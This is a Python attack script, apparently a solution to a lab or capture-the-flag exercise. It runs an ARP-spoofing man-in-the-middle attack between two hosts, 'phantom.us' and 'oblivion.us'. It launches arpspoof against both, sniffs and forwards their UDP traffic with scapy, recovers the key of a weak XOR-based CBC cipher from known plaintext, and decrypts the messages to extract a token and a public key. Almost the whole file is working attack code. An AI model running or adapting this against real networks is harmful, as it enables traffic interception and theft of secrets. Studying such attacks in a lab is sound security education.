import socket
import subprocess
import time
from scapy.all import *
import sys

#### ENCRYPTOR.py ####
# The following code actually comes directly from the phantom and oblivion source code,
#   and implements the encryption algorithm they use to communicate

def xor_bytes(data, key):
    """Perform XOR between two byte sequences of the same length."""
    return bytes([b ^ k for b, k in zip(data, key)])


def pad(data, block_size):
    """Pads the data to be a multiple of the block size using PKCS#7."""
    padding_len = block_size - (len(data) % block_size)
    return data + bytes([padding_len] * padding_len)


def unpad(data):
    """Removes PKCS#7 padding."""
    padding_len = data[-1]
    return data[:-padding_len]


def cbc_encrypt(plaintext, key, iv):
    """
    Encrypts plaintext using CBC mode with XOR-based "encryption."
    :param plaintext: Input plaintext (bytes)
    :param key: Encryption key (bytes), length must match block size
    :param iv: Initialization vector (bytes), length must match block size
    :return: Encrypted ciphertext (bytes)
    """
    block_size = len(iv)
    if len(key) != block_size:
        raise ValueError("Key length must match block size (IV length).")

    plaintext = pad(plaintext, block_size)
    ciphertext = b""
    previous_block = iv

    for i in range(0, len(plaintext), block_size):
        block = plaintext[i:i + block_size]
        # XOR plaintext block with previous block
        encrypted_block = xor_bytes(block, previous_block)
        # XOR result with key to "encrypt" the block
        encrypted_block = xor_bytes(encrypted_block, key)
        ciphertext += encrypted_block
        previous_block = encrypted_block

    return ciphertext


def cbc_decrypt(ciphertext, key, iv):
    """
    Decrypts ciphertext using CBC mode with XOR-based "decryption."
    :param ciphertext: Encrypted data (bytes)
    :param key: Encryption key (bytes), length must match block size
    :param iv: Initialization vector (bytes), length must match block size
    :return: Decrypted plaintext (bytes)
    """
    block_size = len(iv)
    if len(key) != block_size:
        raise ValueError("Key length must match block size (IV length).")

    plaintext = b""
    previous_block = iv

    for i in range(0, len(ciphertext), block_size):
        block = ciphertext[i:i + block_size]
        # XOR block with key to "decrypt" the block
        decrypted_block = xor_bytes(block, key)
        # XOR result with previous block to retrieve plaintext
        decrypted_block = xor_bytes(decrypted_block, previous_block)
        plaintext += decrypted_block
        previous_block = block

    return unpad(plaintext)

# Example usage
# if __name__ == "__main__":
#     # 4-byte IV and key
#     iv = b"\x01\x02\x03\x04"
#     key = b"\x0A\x0B\x0C\x0D"

#     # Plaintext to encrypt
#     plaintext = b"Hello, CBC mode!"

#     # Encrypt
#     ciphertext = cbc_encrypt(plaintext, key, iv)
#     print("Ciphertext:", ciphertext)

#     # Decrypt
#     decrypted_text = cbc_decrypt(ciphertext, key, iv)
#     print("Decrypted text:", decrypted_text.decode())

#### BEGIN MITM ATTACK CODE ####

SERVER_PORT = 1337
SERVER_HOSTNAME = "oblivion.us"
CLIENT_HOSTNAME = "phantom.us"

# Convert hostnames to IP Addresses
SERVER_IP = socket.gethostbyname(SERVER_HOSTNAME)
CLIENT_IP = socket.gethostbyname(CLIENT_HOSTNAME)

def get_mac_address(ip_address):
  try:
    # Converts an IP address into a MAC Address using arp
    subprocess.check_output(["ping", "-c", "1", ip_address]) # Ensure that address is in ARP table
    arp_command = ['arp', '-n', ip_address]
    output = subprocess.check_output(arp_command).decode()
    mac_address = output.split("\n")[1].split()[2]  # Discard header line, then retrieve value in third column
    return mac_address
  except Exception as e:
    print(f"MAC Lookup failed: {e}")
    exit(-1)

CLIENT_MAC = get_mac_address(CLIENT_IP)
SERVER_MAC = get_mac_address(SERVER_IP)
MY_MAC = None

key = None  # Stores the key once it has been recovered
keyNext = False  # If phantom requests the public key, set to True. The next response from oblivion will be stored in `public_key` file
tokenNext = False  # If phantom requests the Token, set to True. The next response from oblivion will be printed as the Token

# This function takes in a packet captured by scapy and processes it
def packet_handler(packet):
  global key
  global keyNext
  global tokenNext
  
  if UDP in packet: # Ensure that this is indeed a UDP packet
    # Recover the data from the packet
    data = bytes(packet[UDP].payload) 
    iv = data[:4]
    ciphertext = data[4:]

    # If we have not done so already, crack the key
    if key is None:
      block1 = ciphertext[:4]
      key = xor_bytes(xor_bytes(block1, iv), b'\x00\x00\x00\x01') # Key = c1 ^ iv ^ 0x00000001

      print(f"Key: {key.hex()}", flush=True)

    # Decrypt the sequence number and message. 
    # The sequence number is decoded as a big endian integer and the message as a string
    plaintext = cbc_decrypt(ciphertext, key, iv)
    seq = int.from_bytes(plaintext[:4], 'big')
    message = plaintext[4:].decode()

    if packet[IP].src == CLIENT_IP: # If from the client, forward to server
      if "TOKEN" in message:
        tokenNext = True  # The next server message will be the Token!
      if "KEY" in message:
        keyNext = True # The next server message will be the Public key!
      print(f"Victim Plaintext: (SEQ {seq}) {message}", flush=True)
      # Modify packet so it has us as the source, and oblivion as the destination
      packet[Ether].dst = SERVER_MAC
      packet[Ether].src = MY_MAC
    else:
      if tokenNext: # This message should contain the Token!
        print(f"TOKEN from server: {message}")
        tokenNext = False
      elif keyNext: # This message should contain the public key! Store to a file
        print(f"Public key from server: {message}")
        with open("public_key", "w") as f:
          f.write(message)
        keyNext = False
      else:
        print(f"Server Plaintext: (SEQ {seq}) {message}", flush=True)
      # Modify packet so it has us as the source, and phantom as the destination
      packet[Ether].dst = CLIENT_MAC
      packet[Ether].src = MY_MAC
    # print(packet.show(dump=True))
    sendp(packet) # Forward the packet on to its new destination
    

def start_sniffing():
  # This function starts the arpspoof attack and sets up scapy's sniffing

  # Start arpspoof as a subproccess
  # Note we convince both servers that we are the other so we receive all the traffic
  print("Starting arpspoof")
  command = "arpspoof -t phantom.us oblivion.us"
  spoofVictim = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, start_new_session=True)
  command = "arpspoof -t oblivion.us phantom.us"
  spoofServer = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, start_new_session=True)

  # Give the spoof a bit to start
  time.sleep(10)

  # Pick up one packet, then wait 10 seconds to force timeout on phantom and have the seq number reset to 1
  print("Waiting 10 seconds to reset seq number")
  time.sleep(10)

  # Reset oblivion by sending a bad packet
  # This is not strictly necessary, but will avoid need to handle a "GO AWAY" message when the sequence is reset
  server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  server_socket.bind(('0.0.0.0', SERVER_PORT))
  server_socket.sendto(b"RESET", (SERVER_IP, SERVER_PORT))

  interface = "eth0" # The interface for scapy to sniff on
  # A Berkeley Packet Filter; filters for UDP packets with our MAC as the destination
  filter_bpf = f"udp and (dst host {SERVER_IP} or dst host {CLIENT_IP}) and ether dst {MY_MAC}" 

  try:
    # Start sniffing, running the function packet_handler on each sniffed packet
    print("Starting sniff")
    sniff(iface=interface, filter=filter_bpf, prn=packet_handler)
  except KeyboardInterrupt:
    print("Stopping arpspoof")
    spoofServer.terminate()
    spoofVictim.terminate()

if __name__ == "__main__":

  if len(sys.argv) < 2:
    print("Need your MAC Address")
    exit(-1)
  MY_MAC = sys.argv[1]

  print(f"My MAC: {MY_MAC}")
  print(f"Phantom.us MAC: {CLIENT_MAC}")
  print(f"Oblivion MAC: {SERVER_MAC}")
  start_sniffing()

